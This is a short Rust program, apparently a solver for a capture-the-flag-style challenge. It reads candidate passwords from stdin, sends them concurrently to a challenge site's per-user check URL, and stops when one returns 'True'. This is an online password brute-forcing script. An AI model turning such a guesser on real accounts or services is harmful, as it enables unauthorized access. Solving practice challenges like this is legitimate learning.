use std::{
    io::{self, Read},
    process, thread,
};

use anyhow::{anyhow, ensure, Result};
use futures::{stream, StreamExt};
use reqwest::ClientBuilder;
use tracing::{debug, info};

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt::init();

    let mut input = String::new();
    io::stdin().read_to_string(&mut input)?;
    let urls: Vec<String> = input
        .lines()
        .map(|pass| format!("https://challenge.hsiao.dev/03/u/luke/check/{pass}"))
        .collect();

    let client = ClientBuilder::new().build()?;

    let num_cpus = thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(1);
    info!("Num CPUs: {num_cpus}");

    let bodies = stream::iter(urls)
        .map(|url| {
            let client = &client;
            let pass = url.rsplit("/").next().unwrap().to_string();
            async move {
                let resp = client.get(url).send().await?;
                ensure!(resp.status().is_success(), "Bad http request");
                let text = resp.text().await?;
                let result: Result<(String, String)> = Ok((pass, text));
                result
            }
        })
        .buffer_unordered(num_cpus);

    bodies
        .for_each(|b| async {
            match b {
                Ok((pass, body)) if &body == "True" => {
                    println!("Password is: {pass}");
                    process::exit(0);
                }
                Ok((pass, body)) => {
                    debug!("{pass}: {body}")
                }
                _ => {}
            }
        })
        .await;

    Err(anyhow!("Didn't find the password :("))
}
